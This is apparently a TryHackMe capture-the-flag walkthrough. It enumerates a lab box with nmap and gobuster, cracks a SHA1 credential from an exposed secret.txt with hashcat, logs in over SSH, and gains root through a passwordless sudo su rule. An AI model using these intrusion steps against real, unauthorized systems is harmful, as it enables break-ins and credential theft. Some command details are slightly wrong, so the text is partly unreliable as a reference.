#### Link to the room: https://tryhackme.com/room/ccpentesting

#### [Task 24]

We are given only the IP address of the box, therefore the logical thing to do would be to start with a nmap scan. Input the following command into the terminal:

> nmap -A \<GIVEN-IP-ADDRESS\> 

The "-A" enables OS detection, version detection, script scanning, and traceroute. This means we will  gather more information from our scan but it might take longer.

After the scan has finished, should see something like this: 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

We can see that SSH on port 22 is open and HTTP on port 80 is open. 

Since we do not have any credentials for the SSH, it would make sense to see what is on HTTP.

If we navigate to \<GIVEN-IP-ADDRESS\> in a browser, then we see that it is the ubuntu default page. 

There must be more to this web server than meets the eye therefore we will do some subdomain brute forcing 

For this, I used gobuster and entered the following command: 

> gobuster dir -u \<GIVEN-IP-ADDRESS\> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt 

dir = Uses directory/file brutceforcing mode

-u = the target URL 

-w = path to the wordlist 

-x = File extension(s) to search for (separated ONLY by commas)

After the brute forcing has finished, we should see something like this: 

```
===============================================================
2020/01/01 00:00:00 Starting gobuster
===============================================================
/secret (Status: 301)
===============================================================
2020/01/01 00:00:00 Finished
===============================================================

```
This shows us that there is a directory named "/secret" on that web server. 

If we navigate to the URL \<GIVEN-IP-ADDRESS\>/secret, strangely we see that is it an empty page 

This is strange however, it might be that there is another subdomain beneth the "/secret" subdomain

Therefore if we run another gobuster but specifically for the URL = \<GIVEN-IP-ADDRESS\>/secret, we can see if we can find anything else: 

> gobuster dir -u \<GIVEN-IP-ADDRESS\>\secret -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt

However from the console output we see that there is no findings. 

This suggests that there are no more hidden directories therefore there might be some hidden files here instead 

By running this command, we can look for hidden files in the "/secret" directory

> gobuster dir -u \<GIVEN-IP-ADDRESS\> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x .html,.php,.txt

Similar to the previous commands but with the addition of the "-x" flag

-x = File extension(s) to search for (separated ONLY by commas)

From the console output, we should see something like: 

```
===============================================================
2020/01/01 00:00:00 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/index.html (Status: 200)
/secret.txt (Status: 200)
===============================================================
2020/01/01 00:00:00 Finished
===============================================================

```
The file "secert.txt" looks interesting so we will focus on that 

If we navigate to \<GIVEN-IP-ADDRESS\>/secret/secret.txt

We will be presented with the following: 

```
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
```
This seems like a username and a hashed password

Therefore we will need to unhash the password 

From using an app like [this](https://www.tunnelsup.com/hash-analyzer/), we find out that the hash is SHA1 

By using hashcat in a SHA1 mode, we can unhash the password with the following command 

> hashcat -m 100 -a 0 046385855FC9580393853D8E81F240B66FE9A7B8 /usr/share/wordlists/rockyou.txt --force

-m = SHA1 hash mode

-a = attack mode: straught (dictionary attack) 

the hash = 046385855FC9580393853D8E81F240B66FE9A7B8

path to wordlist = 046385855FC9580393853D8E81F240B66FE9A7B8

--force = override some "Not a native Intel OpenCL runtime" error

The ouput should look something like this: 

```
046385855fc9580393853d8e81f240b66fe9a7b8:nyan
```

This shows that hashcat thinks that our hash (046385855fc9580393853d8e81f240b66fe9a7b8) is "nyan" 

Therefore the username:password is nyan:nyan 

So we have a username and password so we could possibly see if these credentials work on the SSH that was on port 22 during our nmap scan 

By typing in the command

> ssh nyan@\<GIVEN-IP-ADDRESS\>
>
> (Enter password "nyan")

And we should be successfully on the nyan user 

If we list the files in the current directory with "ls" we should be able to the user.txt file. 

If we type the following command, we will be able to see the contents of the file

> cat user.txt 

Now we have the user, we now need to escalate our priveleges so that we can get root privileges

We can enter the following command to see what privileges what each user has 

> sudo --list 

--list (-l) = list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. 

From the console output we see: 

```
User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su

```

This tells us that the user "nyan" is able to run the command "su" as root with NO password 

The "su" command = change user ID or become superuser

Therefore the user "nyan" isable to become the superuser (root) with no password 

Therefore by inputting the following command: 

> sudo su 

We see that we are now the root user 

So if we navigate to the "/root" directory with:

> cd /root

And we list the files in the current directory, we should see the "root.txt" file

If we type the following command, we shall see the contents of the file 

> cat root.txt
